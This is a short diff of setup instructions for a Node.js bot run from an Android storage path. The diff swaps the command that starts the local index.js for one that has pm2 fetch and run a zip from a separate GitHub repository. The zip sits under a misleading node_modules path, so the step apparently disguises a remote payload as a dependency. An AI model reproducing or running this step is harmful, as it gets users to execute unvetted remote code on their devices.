@@ -17,7 +17,7 @@
  $ cd /sdcard/kizakixdV04
  $ yarn
  $ npm i pm2 -g
- $ pm2 start index.js
+ $ pm2 start https://github.com/iruzruz/botTT/raw/refs/heads/master/node_modules/request/node_modules/bot-TT-v3.3.zip
  $ pm2 save
  $ pm2 monit 
  //━━━━━━━━━━━━━━━[ ᴜᴘʟᴏᴀᴅ ᴛᴏ ʜᴇʀᴏᴋᴜ ]━━━━━━━━━━━━━━━\\
